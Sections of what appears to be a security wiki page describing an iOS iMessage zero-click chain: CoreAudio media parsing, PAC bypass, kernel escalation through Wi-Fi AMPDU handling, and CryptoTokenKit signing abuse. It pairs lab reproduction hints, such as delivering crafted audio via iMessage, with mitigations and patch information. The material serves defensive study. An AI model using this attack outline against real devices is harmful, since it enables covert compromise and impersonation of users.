text: ## Kernel escalation: wireless/AMPDU path example In the observed chain, once in userland with memory corruption and a PAC bypass primitive, kernel control was achieved via code paths in the Wi‑Fi stack (AppleBCMWLAN) under malformed AMPDU handling. Example logs:<sup>[[2]](#references)</sup> ```text IO80211ControllerMonitor::setAMPDUstat unhandled kAMPDUStat_ type 14 IO80211ControllerMonitor::setAMPDUstat unhandled kAMPDUStat_ type 13 ``` General technique: - Use userland primitives to build kernel R/W or controlled call paths. - Abuse reachable kernel surfaces (IOKit, networking/AMPDU, media shared memory, Mach interfaces) to achieve kernel PC control or arbitrary memory. - Stabilize by building read/write primitives and defeating PPL/SPTM constraints where applicable.

title: HT: Post-exploitation: CryptoTokenKit and identity/signing abuse (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## Post-exploitation: CryptoTokenKit and identity/signing abuse Once kernel is compromised, processes like identityservicesd can be impersonated and privileged cryptographic operations invoked via CryptoTokenKit without user prompts. Example logs:<sup>[[1]](#references)[[2]](#references)</sup> ```text CryptoTokenKit operation:2 algo:algid:sign:ECDSA:digest-X962:SHA256 CryptoTokenKit <sepk:p256(d) kid=9a86778f7163e305> parsed for identityservicesd ``` Impact: - Use Secure Enclave–backed keys for unauthorized signing from a compromised context without exporting the key material, breaking trust models that assume only an intact authorized caller can request signatures.<sup>[[1]](#references)[[2]](#references)</sup> - The repository reports device/token impersonation, AGX-framebuffer capture, HID surveillance, and system instability as observed or potential post-compromise effects; Apple does not confirm these chain-specific claims.<sup>[[1]](#references)[[3]](#references)</sup> Defensive angle: - Treat post-kernel integrity breaks as catastrophic: enforce runtime attestation for CTK consumers; minimize ambient authority; verify entitlements at the point of use.

title: HT: Reproduction and telemetry hints (lab only) (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## Reproduction and telemetry hints (lab only) - Delivery: send a crafted AMR/MP4-AAC audio to the target device via iMessage/SMS. - Observe telemetry for the foregoing log lines around parsing and wireless stack reactions. - Ensure devices are fully patched; only test in isolated lab setups.

title: HT: Mitigations and hardening ideas (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## Mitigations and hardening ideas - Patch level: Apple fixed CVE-2025-31200 and CVE-2025-31201 in iOS/iPadOS 18.4.1; keep devices up to date.<sup>[[3]](#references)</sup> - Parser hardening: strict validation for codec cookies/atoms and lengths; defensive decoding paths with bounds checks. - iMessage isolation: avoid relaxing BlastDoor/Blackhole in “known sender” contexts for media parsing. - PAC hardening: reduce PAC-gadget availability; ensure signatures are bound to unpredictable contexts; remove PAC-tolerant bypassable patterns. - CryptoTokenKit: require post-kernel attestation and strong entitlements at call-time for key-bound operations. - Kernel surfaces: harden wireless AMPDU/status handling; minimize attacker-controlled inputs from userland after compromise.

title: HT: Affected versions (as reported) (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## Affected versions (as reported) - Apple lists the affected devices and the fixes in iOS/iPadOS 18.4.1, released April 16, 2025. The broader version range and full chain below are reported by the research repository.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup> - Primary: CoreAudio → AudioConverterService (media auto-parsing path via iMessage/SMS). - Chained: PAC/RPAC path and kernel escalation via AppleBCMWLAN AMPDU handling.
